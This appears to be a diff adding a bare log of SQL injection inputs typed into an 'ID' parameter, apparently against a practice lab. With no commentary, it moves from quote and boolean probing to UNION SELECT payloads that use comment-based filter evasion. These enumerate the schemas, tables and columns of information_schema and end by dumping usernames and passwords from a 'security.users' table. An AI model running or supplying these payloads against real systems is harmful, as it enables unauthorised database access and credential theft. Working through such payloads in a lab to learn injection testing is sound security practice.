@@ -1,0 +1,35 @@
+ID:1
+ID:1'
+ID:1"
+ID:1'
+ID:1 and1=1
+ID:1 and1=2
+ID:1 "
+ID:1 " order by 1,2
+ID:1'
+ID:1"
+ID:1"unioon select 1,2,database()
+ID:1"union select 1,2,database()
+ID:1\"union select 1,2,database()
+ID:-1\"union select 1,2,database()
+ID:-1\"union select 1,2,database()\
+ID:-1"union select 1,2,database()\
+ID:-1"union select 1,2,database()
+ID:-1\"union select 1,2,database()
+ID:-1
+ID:2
+ID:2'
+ID:2"
+ID:2"union select 1,2,database()
+ID:-2"union select 1,2,database()
+ID:-2"/**/union/**/select/**/1,2,database()
+ID:-2"/**/union/**/select/**/1,2,database()
+ID:-1"union/**/select/**/1,group_concat(schema_name),1/**/from/**/information_schema.schemata-- 
+ID:1"union/**/select/**/1,2,database()-- 
+ID:-1"union/**/select/**/1,2,database()-- 
+ID:-1"-- 
+ID:1"-- 
+ID:1"union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()-- 
+ID:-1"union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()-- 
+ID:-1"union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='users'-- 
+ID:-1"union/**/select/**/1,2,group_concat(username,";",password)/**/from/**/security.users-- 
